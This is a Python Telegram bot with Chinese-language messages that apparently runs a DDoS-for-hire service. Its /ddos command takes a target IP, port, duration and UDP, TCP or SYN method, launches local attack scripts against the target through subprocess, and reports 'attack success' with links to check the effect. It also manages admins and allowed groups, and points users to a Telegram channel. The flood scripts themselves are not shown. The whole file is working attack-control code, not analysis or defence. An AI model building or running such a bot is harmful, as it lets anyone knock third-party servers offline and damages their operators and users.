from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackContext
from telegram.ext import filters
import re
import os
import time as t
import subprocess
from datetime import datetime
import pytz

# 正则表达式用于检查 IP 地址
IP_REGEX = re.compile(r'^((25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)$')

# 全局变量
TOKEN = None
ADMIN_IDS = set()
ALLOWED_GROUPS = set()
TASK_TIMESTAMP = 0

def load_config():
    global TOKEN
    global ADMIN_IDS
    global ALLOWED_GROUPS
    global TASK_TIMESTAMP

    TOKEN = None
    ADMIN_IDS = set()
    ALLOWED_GROUPS = set()
    TASK_TIMESTAMP = 0

    if os.path.exists('admin.txt'):
        with open('admin.txt', 'r') as file:
            for line in file:
                line = line.strip()
                if line.startswith('TOKEN='):
                    TOKEN = line.split('=')[1].strip()
                elif line.startswith('admin='):
                    ADMIN_IDS.add(int(line.split('=')[1].strip()))
                elif line.startswith('user='):
                    ADMIN_IDS.add(int(line.split('=')[1].strip()))
                elif line.startswith('group='):
                    ALLOWED_GROUPS.add(int(line.split('=')[1].strip()))
                elif line.startswith('time='):
                    TASK_TIMESTAMP = int(line.split('=')[1].strip())

def save_config():
    with open('admin.txt', 'w') as file:
        file.write(f'TOKEN={TOKEN}\n')
        file.write(f'admin={list(ADMIN_IDS)[0]}\n')
        for user_id in ADMIN_IDS - {list(ADMIN_IDS)[0]}:
            file.write(f'user={user_id}\n')
        for group_id in ALLOWED_GROUPS:
            file.write(f'group={group_id}\n')
        file.write(f'time={TASK_TIMESTAMP}\n')

async def start(update: Update, context: CallbackContext) -> None:
    user_id = update.message.from_user.id
    await update.message.reply_text(
        f'你好！神枪手燕双鹰。您的用户 ID 是 {user_id}\n\n'
        '请使用以下格式：\n\n'
        '/ddos ip 端口 时间 方法\n\n'
        '示例：\n'
        '/ddos 1.2.3.4 80 60 udp  \n'
        '  这将对 IP 地址 1.2.3.4 的 80 端口进行 60 秒的 UDP 攻击\n\n'
        '方法选项：\n'
        '  udp - 用户数据报协议\n'
        '  tcp - 传输控制协议\n'
        '  syn - TCP半开攻击\n\n'
        '请确保输入的 IP 地址、端口、时间和方法都是有效的。\n'
        '时间必须在 10 到 120 秒之间，端口号必须在 1 到 65535 之间。'
    )



async def handle_ddos_command(update: Update, context: CallbackContext) -> None:
    global TASK_TIMESTAMP

    current_time = int(t.time())

    if current_time <= TASK_TIMESTAMP:
        remaining_time = TASK_TIMESTAMP - current_time
        await update.message.reply_text(f'当前有任务正在执行，请稍等 {remaining_time} 秒！！！')
        return

    user_id = update.message.from_user.id
    chat_id = update.message.chat_id

    # 检查是否在允许的群组中
    if chat_id not in ALLOWED_GROUPS and user_id not in ADMIN_IDS:
        await update.message.reply_text('你没有权限执行这个命令。请前往https://t.me/ddosygyg')
        return

    command_text = update.message.text
    command_parts = command_text.split()

    if len(command_parts) != 5:
        await update.message.reply_text(
            '请使用以下格式：\n\n'
            '/ddos ip 端口 时间 方法\n\n'
            '示例：\n'
            '/ddos 1.2.3.4 80 60 udp  \n'
            '  这将对 IP 地址 1.2.3.4 的 80 端口进行 60 秒的 UDP 攻击\n\n'
            '方法选项：\n'
            '  udp - 用户数据报协议\n'
            '  tcp - 传输控制协议\n'
            '  syn - TCP半开攻击\n\n'
            '请确保输入的 IP 地址、端口、时间和方法都是有效的。\n'
            '时间必须在 10 到 120 秒之间，端口号必须在 1 到 65535 之间。'
        )
        return

    command, ip, port, time, method = command_parts

    # 验证 IP 地址格式
    if not IP_REGEX.match(ip):
        await update.message.reply_text('无效的 IP 地址。')
        return

    # 验证端口号是否在有效范围内
    try:
        port = int(port)
        if port < 1 or port > 65535:
            await update.message.reply_text('端口号必须在 1 到 65535 之间。')
            return
    except ValueError:
        await update.message.reply_text('端口号无效。')
        return

    # 验证时间是否在有效范围内
    try:
        time = int(time)
        if time < 10 or time > 120:
            await update.message.reply_text('时间必须在 10 到 120 秒之间。')
            return
    except ValueError:
        await update.message.reply_text('时间无效。')
        return

    # 验证协议类型
    if method not in {'udp', 'tcp', 'syn'}:
        await update.message.reply_text('协议类型无效。使用 udp、tcp 或 syn。')
        return

    # 更新任务时间戳
    TASK_TIMESTAMP = current_time + time
    save_config()

    # 获取当前时间（北京时间）
    tz = pytz.timezone('Asia/Shanghai')
    current_time_str = datetime.now(tz).strftime('%Y-%m-%d %H:%M:%S')

    # 生成成功消息
    success_message = (
        f'DDOS攻击成功: {ip}\n'
        f'攻击端口: {port}\n'
        f'攻击方式: {method.upper()} \n'
        f'攻击时长: {time}秒\n'
        f'请求时间: {current_time_str}\n\n'
        f'查看效果: https://www.itdog.cn/tcping/{ip}:{port}\n'
        f'查看效果: http://port.ping.pe/{ip}:{port}'
    )

    # 回复成功消息
    await update.message.reply_text(success_message)

    # 选择脚本名称
    script_name = f'./{method}.sh'

    # 执行脚本
    subprocess.Popen([script_name, ip, str(port), str(time)])

async def add_admin(update: Update, context: CallbackContext) -> None:
    user_id = update.message.from_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text('你没有权限执行这个命令。')
        return

    if len(context.args) != 2:
        await update.message.reply_text(
            '命令格式错误。使用 /add +|- user_id\n'
            '如: /add + 123456789\n'
            '    /add - 123456789'
        )
        return

    action, new_user_id = context.args
    try:
        new_user_id = int(new_user_id)
    except ValueError:
        await update.message.reply_text('无效的用户 ID。')
        return

    if action == '+':
        ADMIN_IDS.add(new_user_id)
    elif action == '-':
        ADMIN_IDS.discard(new_user_id)
    else:
        await update.message.reply_text('无效的操作。使用 + 添加，- 删除。')
        return

    save_config()
    if action == '+':
        await update.message.reply_text(f'添加成功: {new_user_id}')
    elif action == '-':
        await update.message.reply_text(f'删除成功: {new_user_id}')

async def echo(update: Update, context: CallbackContext) -> None:
    message = update.message.text
    chat_id = update.message.chat_id
    user_id = update.message.from_user.id
    print(f"{chat_id} {user_id} {message}")

def main() -> None:
    # 加载配置
    load_config()

    if TOKEN is None:
        print("TOKEN 未设置。请检查 admin.txt 文件。")
        return

    # 创建 Application 实例
    application = Application.builder().token(TOKEN).build()

    # 添加处理 /start 命令的处理程序
    application.add_handler(CommandHandler('start', start))

    # 添加处理 /ddos 命令的处理程序
    application.add_handler(CommandHandler('ddos', handle_ddos_command))

    # 添加处理 /add 命令的处理程序
    application.add_handler(CommandHandler('add', add_admin))

    # 添加处理所有消息的处理程序
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, echo))

    # 启动机器人
    application.run_polling()

if __name__ == '__main__':
    main()
